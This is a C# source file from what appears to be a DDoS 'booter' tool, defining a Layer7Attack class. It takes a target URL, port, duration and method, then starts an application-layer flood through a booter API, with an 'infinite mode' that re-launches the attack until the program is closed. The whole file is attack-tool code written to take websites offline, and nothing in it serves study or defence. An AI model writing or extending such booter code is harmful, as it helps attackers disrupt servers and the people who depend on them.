using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ts3booter.Layers.Attacks
{
    internal class Layer7Attack
    {
        MainAPI.Ts3Booter ts3;
        public string Url { get; set; }
        public int Port { get; set; }
        public int Time { get; set; }
        public string Method { get; set; }
        public Layer7Attack(MainAPI.Ts3Booter booter)
        {
            ts3 = booter;
        }

        public bool CheckParameters()
        {
            if (Url == null || Url == "")
            {
                return false;
            }
            else if (Port == 0)
            {
                return false;
            }
            else if (Time == 0)
            {
                return false;
            }
            else if (Method == null || Method == "")
            {
                return false;
            }
            return true;
        }
        public void StartAttack()
        {
            bool sent_infinite = false;
            Other.Menus.showTitle();
            Other.Menus.setTitle("Layer7 Attack (" + Url + ")");
            Other.Menus.showMessage("Sponsored by MineHost.ro - cheap web and Minecraft hosting", ConsoleColor.Yellow);
            Console.WriteLine();
            Other.Menus.showMessage("Attack Url: " + Url);
            Other.Menus.showMessage("Attack Port: " + Port);
            Other.Menus.showMessage("Attack Time: " + Time);
            Other.Menus.showMessage("Attack Method: " + Method);
            Console.WriteLine();
            DialogResult result = MessageBox.Show("By enabling infinte mode, the attack will not stop until you close the program", "Enable ∞ mode?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (result == DialogResult.Yes)
            {
                Other.Menus.showMessage("Attempting to start an attack...");
                while (true)
                {
                    if (sent_infinite == false)
                    {
                        if (!sent_infinite)
                        {
                            if (ts3.StartLayer7(Url, Method, Port, Time) == true)
                            {
                                Other.Menus.showMessage("Attack started successfuly!", ConsoleColor.Green);
                                Other.Menus.showMessage("Infinite mode is enabled.");
                                sent_infinite = true;
                            }
                            else
                            {
                                Console.WriteLine();
                                Other.Menus.showMessage("Error while sending attack. Breaking out of loop.", ConsoleColor.Red);
                                break;
                            }
                        }
                        System.Threading.Thread.Sleep((Time * 1000) + 5000);
                        if (ts3.StartLayer7(Url, Method, Port, Time) != true || sent_infinite)
                        {
                            Other.Menus.showMessage("Error while sending attack. Breaking out of loop.", ConsoleColor.Red);
                            break;
                        }
                    }

                }
                Other.Menus.showMessage("Press ANY key to return to the main menu");
                Console.ReadKey();
            }
            else
            {
                Other.Menus.showMessage("Attempting to start an attack...");
                if (ts3.StartLayer7(Url, Method, Port, Time) == true)
                {
                    Other.Menus.showMessage("Attack sent successfuly!", ConsoleColor.Green);
                }
                else
                {
                    Console.WriteLine();
                    Other.Menus.showMessage("Error while sending attack.", ConsoleColor.Red);
                }
                System.Threading.Thread.Sleep((Time * 1000) + 5000);
                Console.WriteLine();
                Other.Menus.showMessage("Attack completed!");
                Other.Menus.showMessage("Press ANY key to return to the main menu");
                Console.ReadKey();
            }
        }
    }
}
